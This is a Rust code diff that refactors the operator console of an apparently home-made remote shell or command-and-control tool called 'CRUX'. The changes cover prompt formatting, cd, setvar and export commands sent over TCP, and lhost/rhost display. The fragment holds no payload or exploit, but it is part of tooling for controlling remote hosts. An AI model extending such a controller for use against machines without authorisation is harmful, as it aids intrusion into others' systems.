@@ -27,37 +27,36 @@ fn send_cmd(stream: &mut TcpStream, cmd_type: CmdType, args_str: String) -> Resu
 }
 
 // Determine prompt symbol based on username
-fn parse_prompt_symbol(username: &str) -> char {
+fn parse_prompt_symbol(username: &str) -> String {
     match username {
-        "root" => return '#',
-        _ => return '$'
+        "root" => return '#'.to_string(),
+        _ => return '$'.to_string()
     };
 }
 
 pub fn linux_shell(stream: &mut TcpStream, meta_str: &str) -> Result<(), Box<dyn std::error::Error>> {
+    // Prompt Preparation
     let mut status = 0;
     let metadata: Metadata = serde_json::from_str(&meta_str)?;
-    let prompt_symbol = parse_prompt_symbol(&metadata.username);
-    let peer_ip = stream.peer_addr()?;
 
+    let prompt_symbol = parse_prompt_symbol(&metadata.username);
+    let peer_ip = stream.peer_addr()?.to_string();
     let mut rl = DefaultEditor::new()?;
 
+    // Main CLI loop
     loop {
         let mut prompt = format!("{}|{}@{}|{}|{} ",
             "CRUX".yellow().bold(),
             metadata.username.blue().bold(),
             metadata.hostname.cyan().bold(),
-            peer_ip.to_string().red().bold(),
-            prompt_symbol);
-
+            peer_ip.red().bold(),
+            prompt_symbol.green().bold());
         // Prepend status if it's not 0
         if status != 0 {
             prompt = format!("[{}]{}", status.to_string().red().bold(), prompt);
         }
 
-        let readline = rl.readline(&prompt);
-
-        match readline {
+        match rl.readline(&prompt) {
             Ok(input) => {
                 if input.is_empty() {
                     continue;
@@ -72,15 +71,20 @@ pub fn linux_shell(stream: &mut TcpStream, meta_str: &str) -> Result<(), Box<dyn
                     Some(cmd) => cmd,
                     _none => continue,
                 };
-                let path = parts.next().unwrap_or(""); // For commands with single path argument
-                                                       // (cd, download, upload, etc.)
+                let args = parts.next().unwrap_or("");
 
                 match cmd {
-                    "exit" => {
+                    "exit" | "quit" => {
                         send_cmd(stream, CmdType::Exit, "".to_string())?;
                     }
                     "cd" => {
-                        send_cmd(stream, CmdType::Cd, path.to_string())?;
+                        send_cmd(stream, CmdType::Cd, args.to_string())?;
+                    }
+                    "setvar" => {
+                        send_cmd(stream, CmdType::Setvar, args.to_string())?;
+                    }
+                    "export" => {
+                        send_cmd(stream, CmdType::Export, args.to_string())?;
                     }
                     "download" => {
                         println!("File download feature under construction...");
@@ -92,6 +96,14 @@ pub fn linux_shell(stream: &mut TcpStream, meta_str: &str) -> Result<(), Box<dyn
                     }
                     "clear" => { // Currently not working for some reason
                         print!("\x1B[2J");
+                        continue;
+                    }
+                    "lhost" => {
+                        println!("{}", stream.local_addr()?);
+                        continue;
+                    }
+                    "rhost" => {
+                        println!("{}", stream.peer_addr()?);
                         continue;
                     }
                     _ => {
